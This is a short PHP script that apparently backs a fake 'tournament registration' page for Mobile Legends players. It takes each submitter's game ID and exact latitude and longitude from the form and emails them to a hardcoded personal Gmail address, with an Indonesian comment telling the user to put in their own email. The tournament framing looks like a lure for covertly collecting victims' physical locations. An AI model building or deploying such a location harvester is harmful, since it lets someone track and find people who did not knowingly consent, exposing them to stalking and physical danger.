<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $ml_id = $_POST['ml_id'];
    $latitude = $_POST['latitude'];
    $longitude = $_POST['longitude'];

    $to = 'ranxd925@gmail.com'; // Ganti dengan email Anda
    $subject = 'Tournament Registration with Location';
    $message = "Mobile Legends ID: $ml_id\nLatitude: $latitude\nLongitude: $longitude";
    $headers = 'From: ranxd925@gmail.com' . "\r\n" .
               'Reply-To: ranxd925@gmail.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        echo 'Registration and location submitted successfully.';
    } else {
        echo 'Failed to submit registration and location. Please try again.';
    }
} else {
    echo 'Invalid request method.';
}
?>